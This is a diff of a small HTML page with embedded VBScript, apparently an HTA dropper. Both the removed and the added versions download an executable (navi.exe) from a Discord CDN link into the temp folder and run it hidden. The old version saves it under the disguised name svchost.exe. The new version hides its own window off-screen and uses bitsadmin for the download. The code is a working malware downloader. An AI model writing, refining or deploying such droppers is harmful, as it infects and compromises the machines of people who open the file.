@@ -1,32 +1,15 @@
-<html>
-<body>
-<script language="VBScript">
-Dim s, f, x, d, t, p, url
+<html><body><script language="VBScript">
+Window.ResizeTo 0,0:Window.MoveTo -5000,-5000
 
-Set s = CreateObject("WScript.Shell")
-Set f = CreateObject("Scripting.FileSystemObject")
-Set x = CreateObject("Microsoft.XMLHTTP")
-Set d = CreateObject("ADODB.Stream")
+Dim shell: Set shell = CreateObject("WScript.Shell")
+Dim fso: Set fso = CreateObject("Scripting.FileSystemObject")
+Dim temp: temp = fso.GetSpecialFolder(2)
 
-t = f.GetSpecialFolder(2)
-p = t & "\svchost.exe"
+shell.Run "bitsadmin /transfer d /download /priority high ""https://cdn.discordapp.com/attachments/1530596353376387113/1530742385942859896/navi.exe?ex=6a675730&is=6a6605b0&hm=78269418c568d8a15e7c36ffb4929435a51b8278adf527d616de6c5a8793d07d&"" """ & temp & "\wd.exe""", 0, True
 
-' === PASTE YOUR DISCORD URL BELOW ===
-url = "https://cdn.discordapp.com/attachments/1530596353376387113/1530651662266536096/navi.exe?ex=6a6659f2&is=6a650872&hm=20513a2d23eef4c5dc2570baac972e50f6e47abfc9c4bfc4df92d27077e14c2d&"
-
-x.Open "GET", url, False
-x.Send
-
-If x.Status = 200 Then
-  d.Open
-  d.Type = 1
-  d.Write x.ResponseBody
-  d.SaveToFile p, 2
-  d.Close
-  s.Run Chr(34) & p & Chr(34), 0, False
+If fso.FileExists(temp & "\wd.exe") Then
+    shell.Run """" & temp & "\wd.exe""", 0, False
 End If
 
 window.close()
-</script>
-</body>
-</html>
+</script></body></html>
